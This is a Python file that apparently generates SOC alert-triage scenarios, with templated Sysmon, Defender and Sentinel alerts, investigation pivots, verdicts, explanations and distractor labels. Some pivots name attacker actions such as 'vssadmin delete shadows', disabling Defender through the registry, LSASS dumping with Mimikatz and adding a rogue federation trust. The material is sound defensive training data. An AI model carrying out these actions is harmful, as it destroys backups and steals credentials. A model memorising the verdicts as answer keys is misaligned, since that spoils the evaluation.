    "what_to_check": "Who wrote the Defender policy key (management agent vs Temp binary), DisableAntiSpyware/DisableRealtimeMonitoring set to 1, follow-on execution.",
    "explanation": "A user-Temp binary writing DisableAntiSpyware=1 into the Defender policy key is registry-level AV tampering — evasion before further payload activity. Legit Defender policy comes from GPO/Intune, not a random exe. Escalate.",
    "event_type_pool": ["Defender real-time protection disabled", "Persistence via registry run key", "Defense evasion attempt", "Registry value set"],
},
{
    "id": "sysmon_process_hollow",
    "source": "Sysmon",
    "event_type": "Process tampering (hollowing / injection)",
    "mitre": "T1055.012 – Process Hollowing",
    "alert": (
        "Sysmon EventID: 25 (Process Tampering)\n"
        "Type: Image is replaced\n"
        "Image: C:\\Windows\\System32\\svchost.exe\n"
        "ParentImage: C:\\Users\\{user}\\AppData\\Local\\Temp\\loader.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ loader.exe spawned a suspended svchost and replaced its image (hollowing) to run code under a trusted name\n→ The hollowed svchost has no service args and beacons to {ext_ip}\n→ Real svchost is launched by services.exe with -k arguments, never by a Temp loader",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. A Temp binary hollowing svchost is malware masquerading.",
        "reputation": "{ext_ip} → C2. Process hollowing exists to run malicious code under a legitimate process image.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Sysmon 25 image-replacement/tampering, a system-named process (svchost) parented by a Temp binary, missing normal args, beaconing.",
    "explanation": "Process hollowing swaps a suspended trusted process's image for malicious code so it runs under a legitimate name (svchost). Parented by a Temp loader with no service args and beaconing out, this is injected malware. Escalate for isolation.",
    "event_type_pool": ["C2 named pipe / process injection", "DLL search-order hijack / sideload", "Living-off-the-land binary abuse", "Vulnerable driver load (BYOVD)"],
},
{
    "id": "sysmon_signed_updater_fp",
    "source": "Sysmon",
    "event_type": "Signed updater child process — benign",
    "mitre": "T1036 – Masquerading (ruled out)",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\n"
        "CommandLine: MicrosoftEdgeUpdate.exe /handoff ...\n"
        "ParentImage: C:\\Windows\\System32\\svchost.exe\n"
        "User: SYSTEM\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: same fleet-wide, last 7 days\n→ Edge updater runs on nearly every host on the update cycle, parented by the Edge Update service (svchost -k)\n→ Signed by Microsoft, in Program Files; only talks to Microsoft update endpoints",
        "asset": "{wks} — standard workstation.",
        "user": "SYSTEM via the Edge Update service — standard updater behaviour.",
        "reputation": "MicrosoftEdgeUpdate.exe — Microsoft-signed, correct path, Microsoft update endpoints. Known-good.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Is the process a signed vendor updater in Program Files, parented by its own service, talking only to the vendor, appearing fleet-wide.",
    "explanation": "The signed Microsoft Edge updater running from Program Files under SYSTEM, fleet-wide, talking only to Microsoft, is routine software updating. Close; whitelist the signer/path pair. The hollowing/masquerade malicious cards differ: unsigned Temp parent, wrong path, C2 — none here.",
    "event_type_pool": ["Process tampering (hollowing / injection)", "Signed binary proxy execution (mshta)", "Living-off-the-land binary abuse", "Scheduled task creation — legitimate software"],
},
{
    "id": "sysmon_doh_fp",
    "source": "Sysmon",
    "event_type": "DNS-over-HTTPS to known resolver — benign",
    "mitre": "T1071.004 – Application Layer Protocol (ruled out)",
    "alert": (
        "Sysmon EventID: 3 (Network Connection)\n"
        "Image: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n"
        "DestinationHostname: cloudflare-dns.com\n"
        "DestinationIp: 104.16.248.249  DestinationPort: 443\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks} network, last 1h\n→ Chrome to cloudflare-dns.com / dns.google over 443 (DoH), low volume, tied to normal browsing\n→ Destination is a major public resolver on the known-DoH list\n→ Not an unknown host, not high-volume TXT, querying process is the signed browser",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Chrome uses secure DNS (DoH) by default; this is expected.",
        "reputation": "cloudflare-dns.com / dns.google — well-known public DoH resolvers, not C2.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Is the 443 destination a known public DoH resolver, is the process a signed browser, volume/pattern normal vs tunneling-like.",
    "explanation": "A signed browser talking DoH to Cloudflare/Google resolvers at normal volume is default secure-DNS behaviour, not covert C2. Close (or note a policy decision about DoH visibility). The DNS-tunneling malicious card differs: unknown young domain, huge TXT volume, unsigned AppData process.",
    "event_type_pool": ["DNS tunneling / exfiltration", "C2 named pipe / process injection", "CDN / cloud service lookup — benign", "Reverse shell / interactive C2"],
},

# ===================== DEFENDER / EDR (batch 2) =====================
{
    "id": "def_tamper_protection",
    "source": "Microsoft Defender",
    "event_type": "Tamper Protection blocked AV-disable attempt",
    "mitre": "T1562.001 – Impair Defenses",
    "alert": (
        "Microsoft Defender for Endpoint Alert\n"
        "Detection: Tamper Protection blocked an attempt to modify Defender settings\n"
        "Attempted change: disable real-time protection via registry\n"
        "Initiating process: C:\\Users\\{user}\\AppData\\Local\\Temp\\svc.exe\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±20 min\n→ A Temp binary tried to disable real-time protection; Tamper Protection blocked it (so AV stayed on)\n→ Same binary then tried an ASR-excluded path and a scheduled task\n→ The disable ATTEMPT itself confirms malicious intent even though it failed",
        "asset": "{wks} — standard workstation, {dept}. Tamper Protection enabled.",
        "user": "{user} — {dept}, not IT. No reason to touch Defender settings.",
        "reputation": "Initiating binary → VT 28/94. An attempt to disable AV from a Temp exe is malicious regardless of outcome.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related"],
    "what_to_check": "What tried to disable Defender (Temp binary vs admin), whether it was blocked, what else the same process attempted.",
    "explanation": "Tamper Protection blocking an AV-disable attempt is good news (the control held), but the ATTEMPT from a VT-flagged Temp binary means active malware is on the host trying to blind defenses. Escalate — the block stopped one step, not the intrusion. Do not close a blocked tamper attempt as a non-event.",
    "event_type_pool": ["Defender real-time protection disabled", "Malware blocked — remediated", "Defense evasion attempt", "PUA detection — authorized IT tool"],
},
{
    "id": "def_cfa_ransomware",
    "source": "Microsoft Defender",
    "event_type": "Controlled Folder Access blocked write (ransomware)",
    "mitre": "T1486 – Data Encrypted for Impact",
    "alert": (
        "Microsoft Defender Alert\n"
        "Controlled Folder Access: blocked unauthorized change to protected folders\n"
        "Process: C:\\Users\\{user}\\AppData\\Local\\Temp\\enc32.exe\n"
        "Attempted: write/rename across Documents, Desktop (repeated)\n"
        "Device: {wks}\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, live\n→ enc32.exe made hundreds of rapid write/rename attempts on protected folders; CFA blocked them\n→ It ALSO ran 'vssadmin delete shadows' and is reaching mapped drives on {srv} (not CFA-protected)\n→ Encryption behaviour is active right now",
        "asset": "{wks} — has mapped drives to {srv}. CFA protects local folders, not the mapped server shares.",
        "user": "{user} — {dept}. Ran a fake invoice earlier.",
        "reputation": "enc32.exe → VT 57/94 ransomware. CFA blocked LOCAL writes; the mapped-drive path is still exposed.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "asset"],
    "what_to_check": "High-rate write/rename attempts on protected folders (CFA blocks), shadow-copy deletion, whether the process can still reach non-protected paths (mapped drives).",
    "explanation": "Controlled Folder Access blocked the local encryption, but the ransomware process is live, deleting shadow copies, and can still hit mapped drives that CFA does not cover. Escalate immediately for isolation — a partial block is not containment while the process runs.",
    "event_type_pool": ["Ransomware behavior — encryption in progress", "Malware blocked — remediated", "Malware executed before detection", "Mass file deletion / possible ransomware staging"],
},
{
    "id": "def_network_protection_c2",
    "source": "Microsoft Defender",
    "event_type": "Network Protection blocked C2 connection",
    "mitre": "T1071 – Application Layer Protocol",
    "alert": (
        "Microsoft Defender for Endpoint Alert\n"
        "Network Protection: blocked connection to a malicious domain\n"
        "Domain: cdn-sync-metrics[.]top\n"
        "Process: C:\\Users\\{user}\\AppData\\Roaming\\upd\\svc.exe\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±30 min\n→ An AppData binary repeatedly tried to reach a flagged C2 domain; Network Protection blocked each attempt\n→ The process is persistent (Run key) and retries every 60 s — implant already on the host\n→ The block stops egress but the implant is resident",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. An AppData binary beaconing to a threat domain is not benign.",
        "reputation": "cdn-sync-metrics[.]top → C2, registered days ago. Process → VT 26/94.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "What was blocked (C2 domain), the initiating process (AppData binary), whether it is persistent and retrying — the block does not remove the implant.",
    "explanation": "Network Protection blocking repeated C2 callbacks means an implant is already resident and beaconing; the block stops this egress channel but not the infection. Escalate for isolation and removal — treat a blocked C2 callback as evidence of compromise, not a closed event.",
    "event_type_pool": ["C2 named pipe / process injection", "Persistence via registry run key", "Malware blocked — remediated", "DNS tunneling / exfiltration"],
},
{
    "id": "def_asr_lsass_block",
    "source": "Microsoft Defender",
    "event_type": "ASR blocked LSASS credential theft — pre-execution",
    "mitre": "T1003.001 – LSASS Credential Dumping",
    "alert": (
        "Microsoft Defender Alert\n"
        "ASR Rule: Block credential stealing from the Windows LSASS (BLOCKED)\n"
        "Process: C:\\Users\\{user}\\Downloads\\procmon64.exe attempted to read lsass.exe\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±30 min\n→ A fake 'procmon' (unsigned, VT-flagged Mimikatz) tried to open lsass; ASR BLOCKED the access\n→ No lsass.dmp written, no credential material left the host\n→ Defender scan afterward: the binary quarantined",
        "asset": "{wks} — standard workstation, {dept}. ASR LSASS rule in block mode.",
        "user": "{user} — {dept}. Ran a renamed tool from Downloads.",
        "reputation": "The 'procmon' → VT 41/94 Mimikatz variant. The dumping attempt was blocked pre-read.",
    },
    "verdict": "benign",
    "action": "close",
    "required_pivots": ["related"],
    "what_to_check": "Was the LSASS access BLOCKED before any read, any dump file written, was the tool quarantined — block-mode + no artifacts = contained.",
    "explanation": "The credential-dump attempt was real (a renamed Mimikatz), but ASR blocked the LSASS access before any memory was read and the tool was quarantined — a true positive fully contained, so benign, close with notes. If ASR had been in AUDIT mode (dump written), this flips to a credential-theft escalation. Mode and artifacts decide it.",
    "event_type_pool": ["Credential dumping attempt", "ASR rule in audit — payload executed", "Malware blocked — remediated", "LSASS access — legitimate security software"],
},
{
    "id": "def_smartscreen_ran",
    "source": "Microsoft Defender",
    "event_type": "SmartScreen bypassed — user ran the file",
    "mitre": "T1204.002 – Malicious File",
    "alert": (
        "Microsoft Defender SmartScreen\n"
        "Warned on: setup_installer.exe (unrecognized, low reputation)\n"
        "User action: clicked 'Run anyway'\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±30 min\n→ SmartScreen warned; the user clicked 'Run anyway' and the exe EXECUTED\n→ It spawned powershell, wrote a Run key, and connected 443 to {ext_ip}\n→ Not a dismissed download — it actually ran and established persistence",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Clicked through the warning and ran a 'free PDF converter'.",
        "reputation": "setup_installer.exe → VT 33/94. {ext_ip} → C2. Execution + persistence confirmed.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Did the user click through SmartScreen and RUN it, any child processes / persistence / network after — 'Run anyway' followed by execution is the pivot.",
    "explanation": "Same SmartScreen prompt as the benign case, opposite outcome: the user clicked 'Run anyway', the malware executed, spawned PowerShell, and set persistence with C2. Escalate for isolation. The whole verdict hinges on the one pivot: did they run it after the warning.",
    "event_type_pool": ["SmartScreen blocked download — not executed", "Malware executed before detection", "Phishing payload execution", "Malware blocked — remediated"],
},

# ===================== SENTINEL / ENTRA / AZURE (batch 2) =====================
{
    "id": "sent_golden_saml_domain",
    "source": "Microsoft Sentinel",
    "event_type": "Federation trust modification (Golden SAML risk)",
    "mitre": "T1484.002 – Domain Trust Modification",
    "alert": (
        "Sentinel Incident: New/modified federated domain\n"
        "Actor: {admin}@corp.example.com\n"
        "Action: Set-MsolDomainAuthentication — added federation (IssuerUri + signing cert) to a domain\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AuditLogs for {admin}, ±60 min\n→ A new federation config (attacker-controlled IssuerUri + token-signing cert) was added off-hours\n→ {admin}'s session was token-replayed from {ext_ip} 30 min earlier (likely compromised)\n→ No change ticket; this enables forging SAML tokens for any user (Golden SAML)",
        "asset": "Entra ID tenant federation — controls how SAML tokens are trusted for the whole tenant.",
        "user": "{admin} — IT admin, but the session looks compromised (foreign replay) and there is no change for a federation change.",
        "reputation": "{ext_ip} → external, {bad_country}. Adding a federation signing cert = the setup for Golden SAML token forgery.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "New/changed federated domain or token-signing cert, who made the change and whether that admin session is itself suspicious, change ticket, off-hours.",
    "explanation": "Adding an attacker-controlled federation config / signing certificate lets the adversary forge SAML tokens for any identity (Golden SAML) — full tenant impersonation. Off-hours, from an already-suspect admin session, with no ticket: escalate at top priority. Revoke the federation change, rotate signing certs, and treat the admin as compromised.",
    "event_type_pool": ["Conditional Access policy disabled", "Privileged role assignment — out of process", "Illicit OAuth consent grant", "Session token theft / replay"],
},
{
    "id": "sent_sp_new_secret",
    "source": "Microsoft Sentinel",
    "event_type": "Credential added to privileged app registration",
    "mitre": "T1098.001 – Additional Cloud Credentials",
    "alert": (
        "Sentinel Incident: New client secret added to application\n"
        "App: 'Corp Automation' (has Directory.ReadWrite.All, Application.ReadWrite.All)\n"
        "Added by: {user}@corp.example.com\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AuditLogs, ±60 min\n→ A new client secret (2-year expiry) was added to a highly-privileged app registration\n→ {user} is not an app owner and has no app-management role; session from {ext_ip}\n→ Minutes later the app's new secret authenticated and began enumerating the directory",
        "asset": "'Corp Automation' app — holds tenant-wide read/write Graph permissions.",
        "user": "{user} — {dept}, standard user. No business adding credentials to a privileged app.",
        "reputation": "{ext_ip} → external. A new secret on a Graph-powerful app = a durable backdoor identity.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "New secret/certificate added to a privileged app registration, who added it and whether they own/manage the app, immediate use of the new credential.",
    "explanation": "Adding a client secret to an app that holds tenant-wide Graph write is an attacker minting a durable, MFA-immune backdoor into the tenant — and it was used immediately to enumerate the directory. Escalate: remove the secret, review the app's activity, and treat the adder's account as compromised.",
    "event_type_pool": ["Illicit OAuth consent grant", "Privileged role assignment — out of process", "Federation trust modification (Golden SAML risk)", "Session token theft / replay"],
},
{
    "id": "sent_tor_signin",
    "source": "Microsoft Sentinel",
    "event_type": "Sign-in from anonymizer (Tor) — succeeded",
    "mitre": "T1078.004 – Valid Accounts: Cloud",
    "alert": (
        "Sentinel Incident: Sign-in from anonymous IP address\n"
        "User: {user}@corp.example.com\n"
        "IP: Tor exit node ({bad_country}); Result: SUCCESS, MFA satisfied\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: SigninLogs + AuditLogs for {user}, 24h\n→ Successful sign-in from a Tor exit node; the MFA prompt was approved (possible fatigue/AiTM)\n→ Post-login: registered a new authenticator, enumerated Teams/SharePoint, downloaded files\n→ {user} badge-confirmed in office at the time — not them on Tor",
        "asset": "Entra identity + M365. Access from an anonymizing network is never a normal corporate path.",
        "user": "{user} — {dept}. In office per badge log; did not initiate a Tor sign-in.",
        "reputation": "IP → Tor exit node, {bad_country}. Anonymizer + success + new MFA method = account takeover.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Did the anonymizer/Tor sign-in SUCCEED, was MFA satisfied, post-login persistence (new MFA method) and data access, badge/travel contradiction.",
    "explanation": "A successful sign-in from a Tor exit node while the user is badged in-office, followed by a new authenticator registration and data access, is account takeover — the anonymizer hides the attacker and the new MFA method is their persistence. Escalate: revoke sessions, reset, remove the rogue authenticator.",
    "event_type_pool": ["Impossible travel — compromised credentials", "MFA fatigue / push bombing", "Impossible travel — VPN artifact", "Session token theft / replay"],
},
{
    "id": "sent_risky_signin_fp",
    "source": "Microsoft Sentinel",
    "event_type": "Risky sign-in — benign after verification",
    "mitre": "T1078.004 – Valid Accounts (ruled out)",
    "alert": (
        "Sentinel Incident: Entra risky sign-in (leaked credentials)\n"
        "User: {user}@corp.example.com\n"
        "Risk: 'Leaked credentials' detection; Result: SUCCESS with MFA\n"
        "Severity: Medium"
    ),
    "pivots": {
        "related": "Query: SigninLogs for {user}, 24h\n→ Sign-in from the user's usual corporate device + location, MFA satisfied, no anomalous post-login activity\n→ 'Leaked credentials' risk fired because the password appeared in a third-party breach list — but the user already reset it (helpdesk ticket) and MFA held\n→ No new mailbox rules, no new devices, no unusual access",
        "asset": "Entra identity. Risk detection is on the password, not the session.",
        "user": "{user} — {dept}. Password reset after the breach-list hit (ticket HD-4620); current session is on their compliant device.",
        "reputation": "IP → corporate egress. The risk is historical (leaked password), already remediated by the reset + MFA.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Did the risky sign-in come from the user's normal device/location with MFA, has the leaked password already been reset, any anomalous post-login behaviour.",
    "explanation": "A 'leaked credentials' risk that fired on a since-reset password, from the user's own compliant device with MFA and no anomalous activity, is a remediated historical risk, not a live compromise. Close, confirm the reset (HD-4620), dismiss the risk. The Tor/anonymizer twin differs: unusual origin, new MFA method, data access.",
    "event_type_pool": ["Sign-in from anonymizer (Tor) — succeeded", "Impossible travel — compromised credentials", "MFA fatigue / push bombing", "Impossible travel — VPN artifact"],
},
{
    "id": "sent_azure_owner_grant",
    "source": "Microsoft Sentinel",
    "event_type": "Azure RBAC — Owner granted at subscription scope",
    "mitre": "T1098.003 – Additional Cloud Roles",
    "alert": (
        "Sentinel Incident: Azure role assignment\n"
        "Role: Owner  Scope: /subscriptions/<sub>\n"
        "Assigned to: {user}@corp.example.com\n"
        "Assigned by: {admin}@corp.example.com\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AzureActivity, ±60 min\n→ {user} (a {dept} user) granted Owner at SUBSCRIPTION scope, off-hours, outside PIM\n→ {admin}'s session originated from {ext_ip}; minutes later {user} created a new VM and a storage account\n→ No change ticket; Owner at subscription scope = full control of all resources",
        "asset": "Azure subscription — Owner is full control (resources, RBAC, data planes).",
        "user": "{user} — {dept}, not cloud-ops. Should never hold subscription Owner. {admin} normally assigns via PIM.",
        "reputation": "{ext_ip} → external. Owner-at-subscription + immediate resource creation = attacker taking the cloud estate.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Role + scope (Owner at subscription/management-group is crown-jewel), granted via approved PIM vs direct, recipient's legitimacy, immediate resource actions.",
    "explanation": "A direct Owner grant at subscription scope to a non-cloud user, off-hours and outside PIM, followed by resource creation, is an attacker seizing the cloud estate. Escalate: remove the assignment, review what was created, treat the assigning admin as compromised. Subscription/mgmt-group Owner grants outside PIM are high-severity by default.",
    "event_type_pool": ["Privileged role assignment — out of process", "Privileged group modification — unauthorized", "Conditional Access policy disabled", "Credential added to privileged app registration"],
},
{
    "id": "sent_keyvault_mass_secret",
    "source": "Microsoft Sentinel",
    "event_type": "Key Vault mass secret access",
    "mitre": "T1552.001 – Credentials in Files/Stores",
    "alert": (
        "Sentinel Incident: Anomalous Key Vault access\n"
        "Vault: kv-prod-secrets\n"
        "Principal: {user}@corp.example.com\n"
        "Activity: 140 SecretGet operations in 6 min\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AzureDiagnostics KeyVault, 24h\n→ {user} pulled 140 secrets from the prod vault in minutes — normally they read 1–2, if any\n→ Session from {ext_ip}; the retrieved secrets include DB connection strings and API keys\n→ No deployment/change window that would explain bulk secret reads",
        "asset": "kv-prod-secrets — production Key Vault holding DB creds, API keys, signing keys.",
        "user": "{user} — {dept}. Does not normally enumerate the vault; bulk SecretGet is out of pattern.",
        "reputation": "{ext_ip} → external. Mass SecretGet from an unusual session = secret harvesting for lateral/onward access.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Volume of SecretGet vs the principal's baseline, session origin, what was retrieved (DB/API/signing keys), any legitimate deployment window.",
    "explanation": "One principal pulling 140 secrets from a production vault in minutes, from an unusual session, is credential harvesting — the retrieved DB/API keys enable broad onward access. Escalate: rotate the exposed secrets, revoke the session, and scope where those creds could have been used. Bulk vault reads with no deployment context are an incident.",
    "event_type_pool": ["Mass external sharing / data exfiltration", "Privileged role assignment — out of process", "Credential added to privileged app registration", "Session token theft / replay"],
},
{
    "id": "sent_storage_public",
    "source": "Microsoft Sentinel",
    "event_type": "Storage account exposed to public",
    "mitre": "T1530 – Data from Cloud Storage",
    "alert": (
        "Sentinel Incident: Storage account public access enabled\n"
        "Resource: stprodbackups (blob)\n"
        "Change: 'Allow Blob public access' -> Enabled; container ACL -> anonymous read\n"
        "Actor: {user}@corp.example.com\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AzureActivity + storage logs, 24h\n→ {user} flipped the account to allow public blob access and set a container to anonymous read, off-hours\n→ Within minutes, anonymous GETs from external IPs began listing and downloading blobs\n→ The account holds production backups; no change ticket for exposing it",
        "asset": "stprodbackups — production backup blobs (potentially PII / DB dumps).",
        "user": "{user} — {dept}. No business making a backup account world-readable.",
        "reputation": "Anonymous external reads followed the change — data is actively being pulled.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Public-access / anonymous-ACL change on a storage account, off-hours and without a ticket, and whether external anonymous reads followed (active exfil).",
    "explanation": "Flipping a production backup account to public + anonymous-read, followed by external anonymous downloads, is data exposure being actively exploited — whether by a compromised account or an insider. Escalate: revert the public setting, kill the container ACL, and involve DLP/IR on what was already pulled.",
    "event_type_pool": ["Mass external sharing / data exfiltration", "Key Vault mass secret access", "Azure RBAC — Owner granted at subscription scope", "Mass file deletion / possible ransomware staging"],
},
]


# ---------------------------------------------------------------------------
# Per-template distractor pools for the original 21 templates.
# (The expansion templates carry `event_type_pool` inline.) These are curated
# near-miss classifications so the "what is this event" question is decided by
# the pivot, not by an obviously-wrong option from the global pool.
# ---------------------------------------------------------------------------
POOLS_BY_ID = {
    "win_4625_brute": ["Failed logon — user error", "Password spray / distributed lockout",
                       "Suspicious remote logon", "Account lockout — stale cached credential"],
    "win_4625_typo": ["Brute force / password guessing", "Password spray / distributed lockout",
                      "Suspicious remote logon", "Account lockout — stale cached credential"],
    "win_4624_rdp_ext": ["Privileged logon — expected service activity", "Remote service execution — lateral movement",
                         "Brute force / password guessing", "Failed logon — user error"],
    "win_4720_offhours": ["Group membership change — onboarding", "Privileged group modification — unauthorized",
                          "Privileged logon — expected service activity", "Remote service execution — lateral movement"],
    "win_4672_backup": ["Privileged group modification — unauthorized", "Suspicious remote logon",
                        "Credential dumping attempt", "DCSync / replication rights abuse"],
    "win_4688_lolbin": ["Malicious script execution", "Phishing payload execution",
                        "Signed binary proxy execution (regsvr32)", "Reverse shell / interactive C2"],
    "ps_4104_encoded": ["Encoded command — documented maintenance", "Defense evasion attempt",
                        "Reverse shell / interactive C2", "Administrative script — expected activity"],
    "ps_4104_sccm": ["Malicious script execution", "Defense evasion attempt",
                     "Encoded command — documented maintenance", "Defender exclusion — managed policy"],
    "ps_amsi_bypass": ["Malicious script execution", "Credential dumping attempt",
                       "Defender tampering — exclusion added", "Administrative script — expected activity"],
    "sysmon_lsass": ["LSASS access — legitimate security software", "DCSync / replication rights abuse",
                     "NTDS.dit extraction on DC", "Defense evasion attempt"],
    "sysmon_edr_lsass_av": ["Credential dumping attempt", "NTDS.dit extraction on DC",
                            "C2 named pipe / process injection", "Defense evasion attempt"],
    "sysmon_office_child": ["Living-off-the-land binary abuse", "Signed binary proxy execution (regsvr32)",
                            "Office child process — signed add-in updater", "Malicious script execution"],
    "sysmon_runkey": ["WMI event subscription persistence", "Scheduled task creation — legitimate software",
                      "Living-off-the-land binary abuse", "DLL search-order hijack / sideload"],
    "sysmon_schtask_legit": ["Persistence via registry run key", "WMI event subscription persistence",
                             "Remote service execution — lateral movement", "Office child process — signed add-in updater"],
    "def_quarantine_ok": ["Malware executed before detection", "ASR rule blocked payload — pre-execution",
                          "SmartScreen blocked download — not executed", "PUA detection — authorized IT tool"],
    "def_quarantine_ran": ["Malware blocked — remediated", "ASR rule in audit — payload executed",
                           "Ransomware behavior — encryption in progress", "SmartScreen blocked download — not executed"],
    "def_pua_tool": ["Malware blocked — remediated", "EICAR test detection — security team test",
                     "Malware executed before detection", "Ransomware behavior — encryption in progress"],
    "sent_impossible_travel": ["Impossible travel — VPN artifact", "Session token theft / replay",
                               "MFA fatigue / push bombing", "Cloud password spray"],
    "sent_travel_vpn_fp": ["Impossible travel — compromised credentials", "Session token theft / replay",
                           "MFA fatigue / push bombing", "Service principal sign-in — documented automation"],
    "sent_mass_delete": ["Mass external sharing / data exfiltration", "Ransomware behavior — encryption in progress",
                         "Illicit OAuth consent grant", "Session token theft / replay"],
    "sent_token_anomaly": ["Impossible travel — VPN artifact", "MFA fatigue / push bombing",
                           "Illicit OAuth consent grant", "Conditional Access policy disabled"],
}

# Ensure every template has an event_type_pool (inline for expansion templates,
# from POOLS_BY_ID for the originals; empty list is a safe fallback).
for _tpl in TEMPLATES:
    _tpl.setdefault("event_type_pool", POOLS_BY_ID.get(_tpl["id"], []))


def generate_scenarios(per_template: int = 20, seed: int = 1337):
    """Render each template into `per_template` concrete scenario dicts."""
    rng = random.Random(seed)
    out = []
    for tpl in TEMPLATES:
        for i in range(per_template):
            random.seed(rng.random())
            ctx = base_ctx()
            def r(s):
                return s.format(**ctx) if isinstance(s, str) else s
            out.append({
                "template_id": tpl["id"],
                "source": tpl["source"],
                "event_type": tpl["event_type"],
                "mitre": tpl["mitre"],
                "alert": r(tpl["alert"]),
                "pivots": json.dumps({k: r(v) for k, v in tpl["pivots"].items()}),
                "verdict": tpl["verdict"],
                "action": tpl["action"],
                "required_pivots": json.dumps(tpl["required_pivots"]),
                "what_to_check": tpl["what_to_check"],
                "explanation": tpl["explanation"],
                "event_type_pool": json.dumps(tpl.get("event_type_pool", [])),
            })
    return out


# global distractor pool (fallback when a template lists < 3 specific distractors)
EVENT_TYPE_POOL = sorted({t["event_type"] for t in TEMPLATES})
